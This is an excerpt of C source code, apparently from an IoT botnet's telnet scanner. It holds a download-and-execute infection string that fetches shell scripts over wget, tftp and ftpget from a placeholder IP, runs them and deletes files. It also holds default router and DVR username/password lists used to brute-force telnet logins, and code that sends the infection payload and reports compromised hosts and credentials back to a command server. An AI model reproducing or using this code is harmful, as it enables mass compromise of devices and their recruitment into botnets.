...
//char *infect = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://IP/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp IP -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g IP; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 IP ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; wget http://IP/scan.py\r\n"; //USE THIS IF YOU CROSS COMPILED WITH DREAMCC.PY
char *infect = "ur payload dumass";
char *usernames[] = {"telnet\0", "root\0", "root\0", "admin\0", "root\0", "admin\0", "root\0", "admin\0", "user\0", "login\0", "support\0", "cisco\0", "netgear\0", "dreambox\0", "\0", "D-Link\0", "ubnt\0", "netman\0", "wlse\0", "wlseuser\0", "support\0"};
char *passwords[] = {"telnet\0", "\0", "root\0", "admin\0", "1234\0", "root\0", "123456\0", "1234\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "\0", "support\0", "cisco\0", "netgear\0", "dreambox\0", "\0", "123456789\0", "vizxv\0", "D-Link\0", "ubnt\0", "michelangelo\0", "vizxv\0", "letmein\0", "diamond\0", "changeme2\0", "NULL\0", "Cisco\0", "cmaker\0", "hsadb\0", "blender\0", "attack\0", "wlsedb\0", "wlsepassword\0", "dreambox\0", "support\0", "alpine\0","maxided\0", "raspberry\0", "Zte521\0"};
char* tmpdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", (char*) 0};
char* advances[] = {":", "ogin", "sername", "assword", "pass", "dvrdvs", (char*)0};
char* fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char* successes[] = {"busybox", "$", "#", "shell", (char*)0};
char* infected[] = {"DREAM"};
char *infectedmessage = "DREAM";
                                                                        ...
                                                                        if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2))
                                                                        {
                                                                            ...
                                                                            else if(contains_success(fds[i].sockbuf))
                                                                            {
                                                                                ...
                                                                                else
                                                                                {
                                                                                    ...
                                                                                    sockprintf(mainCommSock, "UNCONFIRMED %s|%s|%s|23", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                                                                    advance_state(&fds[i], 7);
                                                                                }
                                                                            }
                                                                            else
                              ...
                              if(send(fds[i].fd, infect, strlen(infect), MSG_NOSIGNAL) < 0)
                                  {
                                    ...
                                    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, infected))
                                    {
                                        ...
                                        {
                                            sockprintf(mainCommSock, "TELNET INFECTED - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                            sockprintf(mainCommSock, "CONFIRMED %s|%s|%s|23", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                            fds[i].complete = 3;
                                        }
                                    }
                                      ...
                                      {
                                        if(fds[i].complete !=3){
                                            sockprintf(mainCommSock, "INFECTION FAILED - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);  
                                        }
                                        reset_telstate(&fds[i]);
                                      }
                                    break;
